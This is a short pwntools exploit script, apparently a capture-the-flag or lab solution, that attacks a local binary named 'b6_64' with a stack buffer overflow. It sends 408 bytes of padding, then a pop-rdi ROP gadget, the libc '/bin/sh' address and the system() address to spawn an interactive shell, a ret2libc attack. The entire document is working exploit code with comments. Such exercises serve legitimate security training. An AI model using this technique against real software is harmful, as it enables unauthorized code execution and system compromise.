#Import Pwn Tools
from pwn import *

#Establish the target
target = process("./b6_64")

#Recieve the first line, so we can reach the read call
print target.recvline()

#Establish the offset to reach the rip register
offset = "0"*408

#Rop Gadget to pop bin_sh into rdi
gadget = p64(0x00000000004005e3)

#Address of "/bin/sh" from libc
bin_sh = p64(0x7ffff7b9a177)

#Address of system function from libc
system = p64(0x7ffff7a53390)

#Constructing the paylaod
payload = offset + gadget + bin_sh + system

#Sending the payload
target.sendline(payload)

#Dropping to an interactive prompt
target.interactive()
